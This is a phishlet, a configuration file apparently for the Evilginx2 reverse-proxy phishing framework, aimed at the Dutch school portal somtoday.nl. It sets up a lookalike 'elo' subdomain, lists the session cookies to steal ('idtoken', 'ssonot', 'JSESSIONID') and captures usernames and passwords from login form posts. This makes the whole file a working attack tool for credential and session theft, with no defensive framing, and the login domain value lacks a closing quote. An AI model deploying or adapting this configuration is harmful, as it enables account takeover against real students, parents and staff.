author: '@Jerp'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'elo', orig_sub: '', domain: 'somtoday.nl', session: true, is_landing: true}

sub_filters:
  - {triggers_on: 'somtoday.nl', orig_sub: '', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: 'somtoday.nl'
    keys: ['idtoken','ssonot','JSESSIONID']

auth_urls:
  - '/home/'
  - '/home/.*'  
 

credentials:
  username:
    key: 'AusernameField'
    search: '(.*)'
    type: 'post'
  password:
    key: 'ApasswordField'
    search: '(.*)'
    type: 'post'

login:
  domain: 'somtoday.nl
  path: '/'
